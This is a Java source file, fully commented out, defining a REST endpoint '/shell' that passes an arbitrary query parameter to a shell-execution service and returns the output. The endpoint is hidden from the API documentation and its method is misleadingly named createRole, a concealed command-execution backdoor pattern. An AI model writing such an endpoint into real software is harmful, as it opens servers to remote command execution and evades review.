package com.logic.system.ws;//package com.system.ws;
//
//import javax.ws.rs.POST;
//import javax.ws.rs.Path;
//import javax.ws.rs.Produces;
//import javax.ws.rs.QueryParam;
//import javax.ws.rs.core.MediaType;
//import javax.ws.rs.core.Response;
//import org.springframework.beans.factory.annotation.Autowired;
//import com.system.enums.HttpCodeEnum;
//import com.system.service.IShellService;
//import com.system.util.CommonResult;
//import com.system.util.CommonResultMap;
//import com.wordnik.swagger.annotations.Api;
//import com.wordnik.swagger.annotations.ApiOperation;
//import com.wordnik.swagger.annotations.ApiParam;
//
//@Path("/shell")
//@Api(value = "shell", description = "Shell WebServices",hidden=true, position = 99)
//public class ShellRest {
//
//  @Autowired
//  IShellService shellService;
//
//  @POST
//  @Produces(MediaType.APPLICATION_JSON)
//  @ApiOperation(value = "shell.", position = 1)
//  public Response createRole(@ApiParam(value = "param", required = true) @QueryParam("shell") String shell) {
//    CommonResultMap map = new CommonResultMap();
//    try {
//      String result = shellService.execute(shell);
//      map.setResult(CommonResult.SUCCESS, result);
//    } catch (Exception e) {
//      e.printStackTrace();
//      map.setResult(CommonResult.ERROR, e.getMessage());
//    }
//    return Response.status(HttpCodeEnum.OK.getCode()).entity(map).build();
//  }
//
//}
